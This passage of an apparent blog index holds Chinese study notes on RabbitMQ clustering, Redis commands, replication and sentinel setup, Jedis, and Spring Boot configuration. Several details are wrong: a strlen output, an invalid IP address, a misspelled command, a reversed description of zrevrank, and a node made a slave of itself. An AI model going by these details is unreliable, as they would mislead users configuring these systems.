@Queue(&quot;topic02&quot;),                    key = &quot;aa.*&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive02(String message) &#123;        System.out.println(&quot;02--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(&quot;topic03&quot;),                    key = &quot;aa.#&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive03(String message) &#123;        System.out.println(&quot;03--&quot; + message);    &#125;&#125;\n\nRabbitMQ集群普通模式（默认）：对于Queue来说，消息实体只存在于其中的一个节点A&#x2F;B两个节点仅有相同的元数据，即队列结构。交换机的所有元数据在所有节点上是一致的，而队列的完整信息只有在创建它的节点上，各个节点仅有相同的元数据，即队列结构。当消息进入A节点的Queue中后，consumer从B节点拉取数据时，RabbitMQ会临时在A、B间进行消息传输，把A中的消息实体取出并经过B发送给consumer。所以consumer应尽量连接每个节点，从中取消息。即对于同一个逻辑队列要在多个节点建立物理Queue，否则无论consumer连A或B，出口总在A，会产生瓶颈。该模式存在一个问题就是当A节点故障后，B节点无法取到A节点中还未消费的消息实体。如果做个消息持久化，那么等A节点恢复，然后才可被消费；如果没有做持久化，那就会丢失消息。该模式非常适合非持久化队列，只有该队列是非持久化的，客户端才能重新连接到集群中的其他节点，并且重新创建队列。如果该队列是持久化的，那么唯一的办法就是将故障节点恢复起来。\n镜像模式（高可用模式）：把需要的队列做成镜像模式，存在于多个节点数据Rabbitmg的HA方案。该模式解决了上述问题，其实质和普通模式的不同之处在于，消息实体会主动在镜像节点间同步，而不会在consumer取数据时临时拉取。该模式带来的副作用也很明显，除了降低系统性能以外，如果镜像队列过多，加之有大量的消息进入，集群内部的网铬带宽将会被这种同步通讯大大消耗掉，所以在对可靠性要求较高的场合中适用。\n配置集群\n配置cookie文件Erlang Cookie 是保障不同节点可以互相通信的密钥，要保证集群中不同节点互相通信，必须共享相同的 Erlang Cookie，具体存放在 /var/lib/rabbitmq/.erlang.cookie\n\n跨服务器拷贝 scp /var/lib/rabbitmq/.erlang.cookie ip:/var/lib/rabbitmq\n\n\n分别启动 RabbitMQ 服务\n\n将某个 RabbitMQ 加入到某个服务器节点rabbitmqctl stop_apprabbitmqctl join_cluster rabbit@Arabbitmqctl start_appA 为某个机器的 hostname；在 hostname 为B的机器中执行这些命令\n\n\n查看集群状态：rabbitmqctl cluster_status\nspringboot链接集群配置\nspring.rabbitmq.addresses=ip1:port,ip2:portspring.rabbitmq.username=rootspring.rabbitmq.password=root\n\n配置镜像模式任意节点执行：rabbitmqctl set_policy ha-all &quot;^&quot; &#39;&#123;&quot;ha-mode&quot;:&quot;all&quot;&#125;&#39;\n$ rabbitmqctl set_policy [-p Vhost] Name Pattern Definition [Priority]-p Vhost: 可选参数，针对指定vhost下的queue进行设置Name: policy的名称Pattern: queue的匹配模式(正则表达式)Definition: 镜像定义，包括三个部分ha-mode, ha-params, ha-sync-mode    ha-mode: 指明镜像队列的模式，有效值为 all/exactly/nodes        all: 表示在集群中所有的节点上进行镜像        exactly: 表示在指定个数的节点上进行镜像，节点的个数由ha-params指定        nodes: 表示在指定的节点上进行镜像，节点名称通过ha-params指定    ha-params: ha-mode模式需要用到的参数    ha-sync-mode: 进行队列中消息的同步方式，有效值为automatic和manualpriority: 可选参数，policy的优先级\n\n也可在web管控台中 Admin 中的 Policies 中进行配置。\n","categories":["学习笔记"],"tags":["RabbitMQ","消息队列"]},{"title":"Redis笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Redis%E7%AC%94%E8%AE%B0/","content":"关于RedisRedis官网Redis百度百科REmote DIctionary Server(Redis) 是一个由 Salvatore Sanfilippo 写的 key-value 存储系统，是跨平台的非关系型数据库。Redis 是一个开源的使用 ANSI C 语言编写、遵守 BSD 协议、支持网络、可基于内存、分布式、可选持久性的键值对(Key-Value)存储数据库，并提供多种语言的 API。Redis 通常被称为数据结构服务器，因为值（value）可以是字符串(String)、哈希(Hash)、列表(list)、集合(sets)和有序集合(sorted sets)等类型。  \n使用Redis是为了解决多次读写数据库引发的性能问题。因为Redis是基于内存的数据库，所以它的性能十分优越，读的速度是110000次&#x2F;s,写的速度是81000次&#x2F;s。JavaWeb通常使用它存储缓存用的数据，以及需要高速读&#x2F;写的场合，以减少对基于硬盘的数据库的访问次数。\nRedis中的数据结构及操作命令Redis中的数据结构\n\n\n数据类型\n格式\n例子\n\n\n\nstring(字符串)\n单key:单value\nname:zhangsan\n\n\nlist(列表,按插入顺序)\n单key:多有序value\ncontacts:13952900000,xxx,xxx\n\n\nset(集合,无序且不重复,string类型)\n单key:多无序value\ncity:beijing shanghai shenzhen\n\n\nhash(哈希,适合存储对象)\n单key:对象(属性:值)\nstudent:id:1,name:zhangsan,age:20\n\n\nzset(有序集合,通过double类型分数排序)\n单key:多有序value\ncity:1000 beijing,1500 shanghai,2000 shenzhen\n\n\n关于键(key)的操作命令\n查看redis中的key: keys pattern(查找符合给定模式pattern的key)\nkeys *: 查看redis中所有的key(*匹配零或多个字符)\nkeys h?o: 查看redis中以h开头，o结尾且中间只有一个字符的key(?匹配一个字符)\nkeys h[abc]llo: 查看redis中以h开头，llo结尾，且中间为abc中一个的key([]匹配[]中的一个字符)\n\n\n判断key在redis中是否存在\nexists key(存在返回1，不存在返回0)\nexists key [key key key] (返回值为存在key的数量)\n\n\n移动指定key到指定的redis实例: move key index\nmove k1 1\n\n\n查看指定key的剩余生存时间: ttl key(key未设置生存时间，返回-1；key不存在，返回-2)\nttl k1\n\n\n设置key最大生命时间: expire key seconds(单位秒)\nexpire k2 20\n\n\n查看指定key的数据类型: type key\ntype k1\n\n\n重命名key: rename key newkey\nrename k1 k2\n\n\n删除指定key: del key [key key key](返回值是实际删除key的数量)\ndel k1 k2\n\n\n\n关于string类型数据的操作命令\n将string类型数据设置到redis中: set key value\nset name zhangsan\nset age 20\n\n\n从redis中获取string类型数据: get key\nget name\n&gt; zhangsan\nget age\n&gt; 20\n\n\n追加字符串: append key value(返回值为追加后字符串长度；如果key不存在，则创建并赋值)\nset phone 2333333\nappend phone 8888\n&gt; 23333338888\n\n\n获取字符串长度: strlen key\nstrlen phone\n&gt; 5\n\n\n将字符串数值进行加1运算: incr key(返回加1运算后的数据;key不存在，设置一个初始值为0的key，在进行incr运算；key的value不为数值，报错)\n将字符串数值进行减1运算: decr key(返回减1运算后的数据;key不存在，设置一个初始值为0的key，在进行decr运算；key的value不为数值，报错)\n将字符串数值进行加offset运算: incrby key offset(返回加offset运算后的数据;key不存在，设置一个初始值为0的key，在进行incrby运算；key的value不为数值，报错)\n将字符串数值进行减offset运算: decrby key offset(返回减offset运算后的数据;key不存在，设置一个初始值为0的key，在进行decrby运算；key的value不为数值，报错)\n获取字符串key中从startIndex到endIndex的子串: getrange key startIndex endIndex(闭区间，下标也可为负数)\nset k1 zhangsan\ngetrange k1 2 5\n&gt; angs\ngetrange k1 0 -1\n&gt; zhangsan\n\n\n用value覆盖从startIndex开始的字符串: setrange key startIndex value\nset k1 zhangsan\nsetrange k1 5 233\n&gt; zhang233\nsetrange k1 5 a\n&gt; zhanga33\n\n\n设置string数据同时，设置它的最大生命周期: setex key seconds value\nsetex k1 20 zhangsan\n\n\n设置string数据到redis中，不存在则设置；存在则放弃: setnx key value\nsetnx k1 20\n\n\n批量设置string数据到redis中: mset key1 value1 key2 value2 …\n批量获取string数据: mget key1 key2 …\n\n关于list类型数据的操作命令单key-多有序value多个value之间有顺序(插入顺序)，最左侧是表头，最右侧表尾。每个元素都有下标，表头元素下标是0。下标可以为负数\n\n将一个或多个值依次插入列表的表头: lpush key value [value value …]\nlpush list1 1 2 3\n\n\n获取指定列表中指定下标区间的元素: lrange key startIndex endIndex\nlrange list1 0 2\n&gt;3\n&gt;2\n&gt;1\n\n\n将一个或多个值依次插入列表的表尾: rpush key value [value value …]\nrpush list2 1 2 3\nlrange list2 0 2\n&gt;1\n&gt;2\n&gt;3\n\n\n从指定列表移除并返回表头: lpop key\n从指定列表移除并返回表尾: rpop key\n获取指定列表中指定下标的元素: lindex key index\nlindex list1 1\n&gt;2\n\n\n获取指定列表的长度: llen key\nllen list1\n&gt;3\n\n\n根据count值移除指定列表中跟value相等的数据: lrem key count valuecount&gt;0:从列表的左侧移除count个跟value相等的数据；count&lt;0:从列表的右侧移除count个跟value相等的数据；count&#x3D;0:从列表移除所有跟value相等的数据。\n截取指定列表指定区间组成新的列表，并赋值给key: ltrim key startIndex endIndex\n将指定列表指定下标元素设置为指定值: lset key index value\n将value插入到指定列表中位于pivot元素之前&#x2F;之后的位置: linsert key before&#x2F;after pivot value\n\n关于set类型数据的操作命令单key-多无序value无序且不重复，所以元素没有下标，直接操作数据。\n\n将一个或多个元素添加到指定集合: sadd key value [value value …]如果元素已经存在，则会忽略。返回成功加入的元素个数。\nsadd set1 a b c a\n\n\n获取指定集合中的所有元素: smembers key\nsmembers set1\n&gt;a\n&gt;c\n&gt;b\n\n\n判断指定元素在指定集合中是否存在: sismember key member存在返回1，不存在返回0。\n获取指定集合的长度: scard key\n移除指定集合中的一个或多个元素: srem key member [member member …]不存在的元素会被忽略返回成功移除的元素个数\n随机获取指定集合中的一个或多个元素: srandmember key [count]count&gt;0 随机获取的多个元素不能重复count&lt;0 随机获取的多个元素之间可能重复\n从指定集合中随机移除一个或多个元素: spop key [count]\n将指定集合中指定元素移动到另一个集合: smove source dest member\nsmove set1 set2 a\n\n\n获取第一个集合中有，但其他集合中没有的元素组成新的集合(差集): sdiff key key [key key …]\n获取所有指定集合中都有的元素组成新的集合(交集): sinter key key [key key …]\n获取所有指定集合中所有的元素组成新的集合(并集): sunion key key [key key …]\n\n关于hash类型数据的操作命令单key:field-value field-value …hash是string类型的key和value的映射表，value是一系列的键值对，适合存储对象\n\n将一个或多个field-value对设置到哈希表中: hset key field1 value1 [field2 value2 …]\nhset stu1 id 0001\nhset stu2 id 0002 name zhangsan\n\n\n获取指定哈希表中指定的field的值: hget key field\nhget stu1 id\n&gt;0001\n\n\n批量将多个field-value对设置到哈希表中: hmset key field1 value1 [field2 value2 …]\n批量获取指定哈希表在的field值: hmget key field1 [field2 field3 …]\n获取指定哈希表中所有的field和value: hgetall key\n从指定哈希表中删除一个或多个field: hdel key field1 [field1 field2 …]\n获取指定哈希表中所有的field个数: hlen key\n判断指定哈希表中是否存在某个field: hexists key field\n获取指定哈希表中所有的field列表: hkeys key\n获取指定哈希表中所有的value列表: hvals key\n对指定哈希表中指定的field值进行整数加法运算: hincrby key field int\n对指定哈希表中指定的field值进行浮点数加法运算: hincrbyfloat key field float\n将一个field-value对设置到指定哈希表中: hsetnx stu1 age 30当key-field已经存在，则放弃设置\n\n关于zset类型数据的操作命令有序集合，不允许重复元素。但zset集合中，每个元素会关联一个分数，redis根据分数对元素进行排序，分数可以重复。zset中每个元素都有顺序，所有每个元素也有下标。。\n\n将一个或多个member及其score值加入有序集合: zadd key score member [score member …]如果元素已经存在，则会覆盖其分数\nzadd zset1 1 a\n\n\n获取指定有序集合中指定下标区间的元素: zrange key startIndex endIndex [withscores]withscores 是否显示分数\n获取指定有序集合中指定分数区间(闭区间)的元素: zrangebysorce key min max [withscores]\n删除指定有序集合中的一个或多个元素: zrem key member [member …]\n获取指定有序集合中所有元素的个数: zcard key\n获取指定有序集合中分数在指定区间内的元素个数: zcount key min max\n获取指定有序集合中指定元素的排名(从0开始): zrank key member\n获取指定有序集合中指定元素的分数: zscore key member\n获取指定有序集合中指定元素的排名(按分数从小到大的排名): zrevrank key member\n\n命令小结\n上面的命令是部分常用的命令，写到这里感觉不如去看文档，不过写一遍也算是加深印象。菜鸟教程Redis  \n\nRedis的配置文件redis根目录下提供redis.conf配置文件如果不使用配置文件，redis按默认参数运行。如果使用配置文件，在启动redis服务时，必须指定所使用的配置文件。  \n关于网络的配置\nport：指定redis服务所使用的端口号，默认使用6379\nbind：配置客户端连接redis服务时，所能使用的ip地址，默认可以使用redis服务所在主机上任意一个ip都可以；一般情况会配置一个真实ip。  \n如果配置了port和bind，则客户端连接redis服务时，必须指定端口和ip：redis-cli -h 192.268.11.128 -p 6380redis-cli -h 192.268.11.128 -p 6380 shutdown\n\n\ntcp-keepalive：TCP连接保活策略。单位秒，每过多少秒向连接空闲的客户端发送一个ACK请求，以检查客户端是否挂掉，对于无响应的客户端会关闭连接。如果设置为0，则不会进行保活检测。\n\n常规配置\nloglevel：配置日志级别，开发阶段可以设置成debug，生产阶段通常设置为notice或waring。\nlogfile：指定日志文件。redis运行过程中会输出日志信息；默认会输出到控制台。\ndatabases：配置redis服务创建的数据库实例个数，默认16个。\n\n安全配置\nrequirepass：配置redis的访问密码。默认不配置密码。此参数必须在protected-mode&#x3D;yes(安全模式)是才起作用。\n\nRDB配置\nsave  ：配置复合的快照触发条件，即redis在seconds秒内key改变了changes次，会将快照内数据保存到磁盘一次。默认策略是：\n1分钟内改变1万次\n或5分钟内改变10次\n或15分钟内改变1次\n如果要禁用redis的持久化功能，吧所有的save配置注释即可。\n\n\nstop-writes-on-bgsave-erroe：在bgsave快照操作出错时停止写入磁盘，以保证数据一致性。如果出错时要继续写入，配置为no。\nrdbcompression：设置对存储到磁盘的快照是否压缩。yes会采用LZF算法进行压缩，no关闭此功能，可减少CPU消耗。\nrdbchecksum：快照存储后，可使用CRC64算法进行数据校验，会消耗一定性能，no关闭此功能。\nsdbfilename：持久化数据生成的文件名。默认为dump.rdb\ndir：持久化数据生成文件的保存目录。默认.&#x2F;即redis启动目录\n\nAOF配置\nappendonly：配置是否开启AOF，yes表示开启，no表示关闭。默认no\nappendfilename：AOF保存的文件名\nappendfsync：AOF异步持久化策略\nalways：同步持久化，每次发生数据变化立刻写入磁盘。性能差但数据安全。\neverysec：每秒异步记录一次。默认。\nno：不及时同步，由操作系统决定何时同步。\n\n\nno-appendfysnc-on-rewrite：重写时是否可以运用appendsync，默认no，可以保证数据安全性。\nauto-aof-rewrite-percentage：设置重写的基准百分比。\nauto-aof-rewrite-min-size：设置重写的基准值。\n\nRedis的持久化redis是内存数据库，数据存储在内存中，虽然加快了读取速度，但也对数据安全性产生新的问题。当服务器宕机后，redis数据库中所有数据会全部丢失，所以redis提供了持久化功能——RDB和AOF。\nRDB策略在指定时间间隔内，redis服务执行指定次数的写操作，会自动触发一次持久化操作。RDB策略是redis默认的持久化策略，在redis服务开启时，这种持久化策略默认开启。\nAOF策略采用操作日志来记录进行的每一次操作，每次redis启动时，都会重新执行一遍日志中的命令。效率低下，redis默认不开启。作为RDB策略的补充。\n持久化策略小结\n根据数据的特点来决定使用哪种策略，一般RDB足够。redis主要做缓存，数据在关系型数据库中有备份。\n\nRedis的事务事务：把一组数据库放在一起执行，保证操作的原子性，要么同时成功，要么同时失败。Redis的事务：允许把一组redis命令放在一起执行，把命令序列化，然后一起执行，保证部分原子性。\n\nmulti：用来标记一个事务的开始。\n压入事务队列\nmulti\nset k1 v1\nset k2 v2 \n…\n\n\nexec：用来执行事务队列中的所有命令。\nexec\n\n\nredis的事务只能保证部分原子性：\n如果一组命令中，在压入事务队列过程中发生错误，则本事务中所有命令都不执行，保证事务原子性。\n如果一组命令中，艾压入队列过程正常，但在执行事务队列命令时发生错误，则只会影响发生错误的命令，不会影响其他命令，不能保证事务的原子性。\n\n\ndiscard：清除所有已经压入队列中的命令，并且结束整个事务。\nmulti\nset k1 v1\nset k2 v2\ndiscard\n\n\nwatch：监控某一个键，当事务在执行过程中，此键代码的值发生变化，则本事务放弃执行；否则，正常执行。\nunwatch：放弃监控某一键\n\n\n事务小结：1.单独的隔离操作：事务中的所有命令会序列化、顺序地执行。执行过程中不会被其他客户端的命令请求打断，除非是用watch进行监视。2.不保证事务的原子性：同一事务如果某一命令执行失败，其他命令仍可能被继续执行，redis事务没有回滚。\n\nRedis消息的发布与订阅(了解)redis客户端订阅频道，消息的发布者往频道上发布消息，所有订阅此频道的客户端都能够接收到消息。\n\nsubscribe：订阅一个或多个频道的消息。\nsubscribe ch1 ch2 ch3\n\n\npublish：将消息发布到指定频道\npublish ch1 hello\n\n\npsubscribe：订阅一个或多个频道的消息，频道名支持通配符。\n\nRedis的主从复制主少从多，主写从读，读写分离，主写同步复制到从。\n搭建一主二从的redis集群：\n\n搭建三台redis服务：使用一台机器，三个不同端口模拟\n修改配置文件(bind、port等),以redis6379.conf为例\nbind 127.0.0.1\nport 6379\npidfile &#x2F;var&#x2F;run&#x2F;redis_6379.pid\nlogfile “6379.log”\ndbfilename dump6379.rdb\n启动服务\nredis-server redis6379.cond &amp;\nredis-server redis6380.cond &amp;\nredis-server redis6381.cond &amp;\n\n\n连接到redis服务\nredis-cli -h 127.0.0.1 -p 6379\nredis-cli -h 127.0.0.1 -p 6380\nredis-cli -h 127.0.0.1 -p 6381\n\n\n查看三台redis服务在集群中的主从角色：\ninfo replication\n默认情况下，所有的redis服务都是主机，既能读也能写，但都没有从机。\n\n\n设置主从关系：设从不设主\n在6380上执行：slaveof 127.0.0.1 6379\n在6381上执行：slaveof 127.0.0.1 6379\n\n\n全量复制：一旦主从关系确定，会自动把主机上已有的数据同步复制到从库\n增量复制：主库写数据会自动同步到从库\n主写从读，读写分离：\n在从机上进行写操作会报错\n\n\n主机宕机、从机原地待命：\n从机可以继续读，但数据不会再更新。\n\n\n主机恢复、一切恢复正常\n从机宕机、主机少一个从机，其他从机不变。\n从机恢复、需重新设置主从关系。\n从机上位：\n主机宕机、从机原地待命\n从机断开原来的主从关系\n在6380上执行：slaveof no one\n重新设置主从关系\n在6381上执行：slaveof 127.0.0.1 6380\n\n\n原主机恢复\n在6379上执行：slaveof 127.0.0.1 6379\n让6379变为6380的从机\n或者在6379上执行：slaveof 127.0.0.1 6381\n让6379成为6381的从机，此时6381既是主机又是从机，但他不能读。\n\n\n\n\n小结：一台主机配置多台从机，一台从机也可以配置多台从机，从而形成一个庞大的集群。减轻一台主机的压力，但是增加了服务间的延迟。\n\nRedis的哨兵模式主机宕机、从机上位的自动版\n\n搭建一主二从的redis集群(见上文)\n提供哨兵的配置文件：\n在redis安装目录下下创建配置文件：redis_sentinel.conf\n写入 sentinel monitor dc-redis 127.0.0.1 6379 1\n\n\n启动哨兵服务：redis-sentinel redis_sentinel.conf\n主机宕机，哨兵自动选择从机上位\n原主机恢复，自动从属于新主机\n\n\n哨兵小结可以设置多个哨兵。即每个redis服务都可以设置一个哨兵。哨兵模式三大任务：监控、提醒、自动故障迁移\n\nJedis操作Redis使用Redis官方推荐的Jedis，在Java应用中操作Redis。操作Redis的命令在jedis中以方法形式出现。Jedis文档\nmaven配置\n&lt;dependency&gt;  &lt;groupId&gt;redis.clients&lt;/groupId&gt;  &lt;artifactId&gt;jedis&lt;/artifactId&gt;  &lt;version&gt;4.2.2&lt;/version&gt;&lt;/dependency&gt;\n示例java程序\npackage org.example;import redis.clients.jedis.Jedis;import java.util.Set;public class Main &#123;    public static void main(String[] args) &#123;        //连接redis        Jedis jedis = new Jedis(&quot;127.0.0.1&quot;, 6379);        //使用jedis对象操作redis服务        Set&lt;String&gt; ret = jedis.keys(&quot;*&quot;);        System.out.println(ret);    &#125;&#125;\n输出：[]\nJedis中连接池的使用工具类\npackage org.example;import redis.clients.jedis.JedisPool;import redis.clients.jedis.JedisPoolConfig;public class RedisUtils &#123;    private static JedisPool pool;    //创建JedisPool对象    public static JedisPool open(String ip, int port) &#123;        if (pool == null) &#123;            //创建JedisPool            //创建JedisPoolConfig，给config设置连接池的参数，使用config对象创建JedisPool            JedisPoolConfig config = new JedisPoolConfig();            //给config设置连接池的参数            //设置最大线程数，一个线程就是一个Jedis            config.setMaxTotal(20);            //设置最大空闲数            config.setMaxIdle(2);            //设置检查项为true，表示从线程池中获取的对象一定是经过检查可用的            config.setTestOnBorrow(true);            //创建Pool对象            /*             * poolConfig:配置器JedisPoolConfig             * host:redis所在linux的ip             * port:redis的端口             * timeout:链接redis超时，毫秒值             * password:链接redis的访问密码             */            pool = new JedisPool(config, ip, port, 6000);        &#125;        return pool;    &#125;    //关闭Pool对象    public static void close() &#123;        if (pool != null) &#123;            pool.close();        &#125;    &#125;&#125;\n测试类\npackage org.example;import redis.clients.jedis.Jedis;import redis.clients.jedis.JedisPool;import java.util.Set;public class Main &#123;    public static void main(String[] args) &#123;        String host = &quot;127.0.0.1&quot;;        int port = 6379;        //创建JedisPool对象，从JedisPool中获取Jedis        JedisPool pool = null;        Jedis jedis = null;        try &#123;            pool = RedisUtils.open(host, port);            //从pool中获取Jedis            jedis = pool.getResource();            Set&lt;String&gt; ret = jedis.keys(&quot;*&quot;);            System.out.println(ret);        &#125; finally &#123;            //关闭Jedis对象，把Pool中获取的Jedis放回Pool，供其他请求使用。            if (jedis != null) &#123;                jedis.close();            &#125;        &#125;    &#125;&#125;\n输出：[]\nRedis客户端工具——Redis Desktop Manager使用命令行还行，就不用客户端了。贴个官网链接\n总结\nRedis的学习告一段落，其中用的最多的应该还是对数据的操作。\n\n","categories":["学习笔记"],"tags":["Redis","数据库"]},{"title":"SpringBoot笔记","url":"/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SpringBoot%E7%AC%94%E8%AE%B0/","content":"第一章 xml与JavaConfig\n为什么要使用springboot因为Spring、SpringMVC需要使用大量的配置文件（xml文件）还需要配置各种对象，把使用的对象放到spring容器中才能使用对象需要了解其他框架的配置规则比较繁琐\nSpringBoot相当于 不需要配置文件的Spring+SpringMVC。常用的框架和第三方库都已经配置好了，直接用。\nSpringBoot开发效率高，使用更方便。\n\n@JavaConfigjavaConfig：使用java类作为xml配置文件的代替，是配置spring容器的纯Java方式。在这个Java类中可以创建Java对象，把对象放入sprig容器中（注入到容器）。使用两个注解：\n\n@Configuration：放在一个类上，表示这个类作为配置文件使用。\n@Bean：放在方法上，声明对象，把这个对象注入到容器。相当于\n\n使用示例\npackage org.example;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;/** * Configuration：表示当前类作为配置文件使用。是用来配置容器的 * 位置：在类上 *  * 这个类相当于beans.xml */@Configurationpublic class SpringConfig &#123;    /**     * 创建方法，方法返回值为对象。方法上加入@bean注解     * 方法返回值对象就注入到容器中     *     * @Bean: 把对象注入到Spring容器中。作用相当于&lt;bean&gt;     * 位置：在方法上     * 说明：@Bean，不指定对象名称，默认方法名是id     */    @Bean    public Student createStudent() &#123;        Student s1 = new Student();        s1.setName(&quot;张三&quot;);        s1.setId(1);        return s1;    &#125;    @Bean(name = &quot;student2&quot;)    public Student createStudent2() &#123;        Student s2 = new Student();        s2.setName(&quot;李四&quot;);        s2.setId(2);        return s2;    &#125;&#125;\n\n@ImportResource@ImportResource：导入其他的xml配置文件，等于在xml &lt;import resources=&quot;其他配置文件&quot;/&gt;使用示例\n@ImportResource(value = &#123;&quot;classpath:applicationContext.xml&quot;,&quot;classpath:beans.xml&quot;&#125;)public class SpringConfig &#123;&#125;\nvalue参数可以是数组，以导入多个xml配置文件  \n@PropertyResource@PropertyResource： 读取properties属性配置文件可以实现外部化配置，在程序代码之外提供数据。步骤：\n\n在resources目录下，创建properties文件，使用key&#x3D;value的格式提供数据\n在PropertyResource指定properties文件的位置\n使用@Value(value&#x3D;”${key}”)\n\n@Configuration@ImportResource(value = &quot;classpath:applicationContext.xml&quot;)@PropertySource(value = &quot;classpath:config.properties&quot;)@ComponentScan(basePackages = &quot;org.example.vo&quot;)public class SpringConfig &#123;&#125;\n\n第二章 SpringBoot介绍Spring官网SpringBoot是Spring中的一个成员，可以简化Spring，SpringMVC的使用。核心还是IOC容器。\n特点\n\nCreate stand-alone Spring applications  创建Spring应用\nEmbed Tomcat, Jetty or Undertow directly (no need to deploy WAR files)  内嵌的tomcat，jetty，undertow服务器（不用部署war包）\nProvide opinionated ‘starter’ dependencies to simplify your build configuration  提供了starter起步依赖，来简化应用的配置  比如使用MyBatis框架，需要在Spring项目中，配置MyBatis的对象SqlSessionFactory，Dao的代理对象  在SpringBoot项目中，在pom.xml中，加入一个mybatis-spring-boot-starter依赖\nAutomatically configure Spring and 3rd party libraries whenever possible  尽可能去配置spring和第三方库，自动配置（将spring和第三方库中的对象创建好，放入容器中，以便于使用）\nProvide production-ready features such as metrics, health checks, and externalized configuration  提供了健康检查，统计，外部化配置\nAbsolutely no code generation and no requirement for XML configuration  不用生成代码，不用使用xml做配置\n\n创建SpringBoot项目使用Spring提供的初始化器，即向导创建SpringBoot应用\n使用的地址：https://start.spring.io国内的地址：https://start.springboot.io也可以直接访问网址，创建并下载。\nSpringBoot的目录结构：\n注解的使用@SpringBootApplication复合注解：由@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan组成\n\n@SpringBootConfiguration部分源码：@Configurationpublic @interface SpringBootConfiguration &#123;    @AliasFor(        annotation = Configuration.class    )    boolean proxyBeanMethods() default true;&#125;\n说明：使用了@SpringBootConfiguration注解标注的类，可以作为配置文件使用，可以使用BEAN声明对象，注入到容器。\n@SpringBootConfiguration启用自动配置，把java对象配置好，注入到spring容器中。例如：将MyBatis对象创建好，放入到容器中。\n@ComponentScan扫描器，找到注解，根据注解功能创建对象，给属性赋值等。默认扫描的包：@ComponentScan所在的包和子包。\n\nSpringBoot的配置文件配置文件名称：application拓展名：properties(key&#x3D;value);yml(ket:value)使用application.properties或application.yml\napplication.properties示例：\n#设置端口号server.port=8080#设置访问应用上下文路径，contextpathserver.servlet.context-path=/boot\n\napplication.yml示例：\nserver:  port: 8080  servlet:    context-path: /boot\n\n注：properties与yml同时存在时，会使用properties。（一般只是用一个，不要两个一起用）\n多环境配置有开发环境，测试环境，上线环境。每个环节都有不同的配置信息，例如端口，上下文件，数据库url，用户名，密码等。\n使用多环境配置文件，可以方便切换不同的配置。使用方式：创建多个配置文件，名称规则：application-环境名称.properties(yml)\n创建开发环境的配置文件：application-dev.properties(application-dev.yml)创建测试环境的配置文件：application-test.properties\n在application.properties中指定使用哪个配置文件\n#激活使用哪个配置文件spring.profiles.active=dev\n\n自定义配置@Value(“${key}”)key来自application.properties\nstudent.name=咕咕咕student.age=20\n注解加在属性定义上，便能读取配置中的数据。\n@Controllerpublic class SpringBoot &#123;    @Value(&quot;$&#123;student.name&#125;&quot;)    private String name;    @RequestMapping(value = &quot;/hello&quot;, produces = &quot;application/json&quot;)    @ResponseBody    public String hello() &#123;        return &quot;hello,&quot; + name;    &#125;&#125;\n\n@ConfigurationProperties(prefix&#x3D;”…”)将整个文件映射为一个对象，用于自定义配置项比较多的情况。在类上加上@Component@ConfigurationProperties(prefix &#x3D; “student”)注解，prefix内为属性名\npackage com.example.vo;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.stereotype.Component;@Component@ConfigurationProperties(prefix = &quot;student&quot;)public class Student &#123;    private String name;    private String age;    public String getName() &#123;        return name;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public String getAge() &#123;        return age;    &#125;    public void setAge(String age) &#123;        this.age = age;    &#125;    @Override    public String toString() &#123;        return &quot;Student&#123;&quot; +                &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; +                &quot;, age=&#x27;&quot; + age + &#x27;\\&#x27;&#x27; +                &#x27;&#125;&#x27;;    &#125;&#125;\n\n在Controller中使用@Resource自动注入，从容其中拿到对象，进行赋值使用。\nSpringBoot中使用jsp(不推荐使用jsp，因为前后端要分离)SpringBoot不推荐使用jsp，而是使用模板技术代替jspSpringBoot原生不支持jsp，需要配置依赖项。  \n\n加入一个处理jsp的依赖，负责编译jsp文件。  \n&lt;dependency&gt;    &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;    &lt;artifactId&gt;tomcat-embed-jasper&lt;/artifactId&gt;&lt;/dependency&gt;\n如果需要使用servlet，jsp，jstl的功能，还需要添加额外的依赖项。\n&lt;dependencys&gt;    &lt;!--jstl的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;        &lt;artifactId&gt;jstl&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;!--servlet的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;        &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;!--jsp的依赖--&gt;    &lt;dependency&gt;        &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt;        &lt;artifactId&gt;javax.servlet.jsp-api&lt;/artifactId&gt;        &lt;version&gt;2.3.3&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencys&gt;\n\n创建一个存放jsp的目录，一般叫webapp index.jsp\n\n需要在pom.xml指定jsp文件编译后的存放目录 META-INF&#x2F;resources\n\n创建Controller，访问jsp\n\n在application.properties文件中配置视图解析器\n\n\n使用示例：index.jsp\n&lt;%@ page contextType=&quot;text/html;charset=UTF-8” language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;jsp文件&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h3&gt;使用jsp显示Controller中的数据 $&#123;data&#125;&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;\nController类\npackage com.example;import org.springfarmework.stereotype.Controller;@Controllerpublic class JspController&#123;//    public String Jsp(HttpServletRequest request)&#123;//        request.setAttribute(&quot;data&quot;,&quot;SpringBoot使用jsp&quot;);//        //视图的逻辑名称//        return &quot;index&quot;;//    &#125;    /**     *      * @param model     * @return     */    public String Jsp(Model model)&#123;        //将数据放入到request作用域        model.addAttribute(&quot;data&quot;,&quot;SpringBoot使用jsp&quot;);        //视图的逻辑名称        return &quot;index&quot;;    &#125;    &#125;\napplication.properties中添加\n#配置视图解析器 前缀及后缀#/ = 